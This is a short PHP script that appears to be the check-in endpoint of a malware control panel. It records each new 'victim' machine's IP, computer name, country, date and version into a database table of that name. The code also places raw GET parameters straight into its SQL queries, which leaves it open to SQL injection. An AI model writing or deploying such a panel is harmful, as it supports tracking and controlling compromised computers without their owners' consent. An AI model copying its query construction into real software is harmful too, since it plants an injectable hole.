<?php
session_start();
include('Information.php');
if (isset($_GET["connect"])) {
    $conn = new mysqli($servername, $username, $password, $dbname);
    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }
    $ip = $_GET["ip"];
    $cname = $_GET["cname"];
    $country = $_GET["country"];
    $date1 = $_GET["date"];
    $version = $_GET["version"];
    $sql1 = "SELECT ip FROM victim WHERE `ip`='".$ip."'";
    $result = $conn->query($sql1);
    if (!$result->num_rows > 0) {
        $sql = "INSERT INTO victim (ip, cname, country, date, version)
                VALUES ('$ip', '$cname', '$country', '$date1', '$version')";
        if ($conn->query($sql) === TRUE) {
            echo "true";
        } else {
            echo "false";
        }
    }
    
    $conn->close();
}
?>